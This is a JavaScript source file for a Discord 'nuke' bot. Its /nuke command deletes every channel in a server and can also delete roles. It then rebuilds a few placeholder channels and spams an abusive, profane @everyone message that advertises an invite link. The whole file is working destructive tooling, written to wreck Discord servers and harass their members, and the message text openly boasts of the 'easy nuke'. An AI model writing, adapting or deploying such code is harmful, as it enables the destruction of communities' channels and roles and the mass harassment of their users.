import 'dotenv/config';
import {
  Client, GatewayIntentBits, Events, ChannelType, MessageFlags,
  PermissionFlagsBits,
} from 'discord.js';

/* ------------------------------------------------------------------ config */

// always posted after a nuke — edit this line to change the text
const NUKE_MESSAGE =
  "@everyone FUCK Y'ALL BITCHES, EASY NUKE ATP JUST JOIN OUR SERVER https://discord.gg/3RhaMXkRnS";

// how many channels to rebuild (add/remove freely)
const TEXT_CHANNELS  = ['general', 'chat', 'main', 'lounge'];
const VOICE_CHANNELS = ['voice', 'Voice 2'];

// how many times the message gets spammed in the first text channel
const SPAM_COUNT = 5;

// optional: a role NAME that may also nuke, on ANY server (admins always can).
// leave empty for admins only. servers where you want this need a role with this exact name.
const NUKE_ROLE_NAME = ''; // e.g. 'nuke'

// delay between channel operations so Discord's channel rate limit doesn't eat them
const sleep = ms => new Promise(r => setTimeout(r, ms));

const client = new Client({ intents: [GatewayIntentBits.Guilds] });

/* ------------------------------------------------------------------ events */

client.once(Events.ClientReady, c => {
  console.log(`Logged in as ${c.user.tag} — serving ${c.guilds.cache.size} guild(s).`);
});

client.on(Events.Error, err => console.error('[client]', err));

client.on(Events.InteractionCreate, async interaction => {
  if (!interaction.isChatInputCommand()) return;

  try {
    if (interaction.commandName === 'help') return await help(interaction);
    if (interaction.commandName === 'nuke') return await nuke(interaction);
  } catch (err) {
    console.error(err);
    const payload = {
      content: `Error: \`${err.message}\``,
      flags: MessageFlags.Ephemeral,
    };
    if (interaction.deferred || interaction.replied) {
      await interaction.editReply(payload).catch(() => {});
    } else {
      await interaction.reply(payload).catch(() => {});
    }
  }
});

/* ---------------------------------------------------------------- commands */

async function help(interaction) {
  return interaction.reply({
    content: [
      '**Commands**',
      '`/nuke [roles]` — delete every channel and rebuild the server',
      '`/help` — this message',
      '',
      'Only **Administrators** can run `/nuke`.',
    ].join('\n'),
    flags: MessageFlags.Ephemeral,
  });
}

async function nuke(interaction) {
  const { guild } = interaction;
  if (!guild) {
    return interaction.reply({
      content: 'Run this inside a server.',
      flags: MessageFlags.Ephemeral,
    });
  }

  /* ----- who is allowed to nuke? admins always, plus optional role name ----- */

  const isAdmin = interaction.memberPermissions.has(PermissionFlagsBits.Administrator);
  const hasRole =
    !!NUKE_ROLE_NAME &&
    interaction.member.roles.cache.some(
      r => r.name.toLowerCase() === NUKE_ROLE_NAME.toLowerCase()
    );

  if (!isAdmin && !hasRole) {
    return interaction.reply({
      content: 'You need **Administrator** (or the nuke role) to do this.',
      flags: MessageFlags.Ephemeral,
    });
  }

  const wipeRoles = interaction.options.getBoolean('roles') ?? false;

  await interaction.deferReply({ flags: MessageFlags.Ephemeral });

  const me = guild.members.me;

  if (!me.permissions.has(PermissionFlagsBits.ManageChannels)) {
    return interaction.editReply('I need the **Manage Channels** permission.');
  }

  // 1. roles (optional)
  if (wipeRoles) {
    if (!me.permissions.has(PermissionFlagsBits.ManageRoles)) {
      console.warn('Skipping roles: missing Manage Roles.');
    } else {
      for (const role of [...guild.roles.cache.values()]) {
        if (role.managed) continue;                                   // bot/integration roles
        if (role.id === guild.id) continue;                           // @everyone
        if (role.comparePositionTo(me.roles.highest) >= 0) continue;  // higher than us
        await role.delete().catch(e => console.error('[role]', role.name, e.message));
        await sleep(200);
      }
    }
  }

  // 2. channels — snapshot first, the cache mutates as we delete
  for (const channel of [...guild.channels.cache.values()]) {
    await channel.delete().catch(e => console.error('[delete]', channel.name, e.message));
    await sleep(250);
  }

  // 3. rebuild
  const category = await guild.channels.create({
    name: 'general',
    type: ChannelType.GuildCategory,
  });
  await sleep(250);

  let firstText = null;
  for (const name of TEXT_CHANNELS) {
    const ch = await guild.channels.create({
      name,
      type: ChannelType.GuildText,
      parent: category.id,
    });
    if (!firstText) firstText = ch;
    await sleep(250);
  }

  for (const name of VOICE_CHANNELS) {
    await guild.channels.create({
      name,
      type: ChannelType.GuildVoice,
      parent: category.id,
    });
    await sleep(250);
  }

  // 4. spam it
  if (firstText) {
    for (let i = 0; i < SPAM_COUNT; i++) {
      await firstText.send(NUKE_MESSAGE).catch(() => {});
      await sleep(150);
    }
  }

  // the origin channel is gone by now, so this can fail harmlessly
  await interaction
    .editReply(
      `Done. Rebuilt ${TEXT_CHANNELS.length} text + ${VOICE_CHANNELS.length} voice, spammed ${SPAM_COUNT}x.`
    )
    .catch(() => {});
}

client.login(process.env.DISCORD_TOKEN);
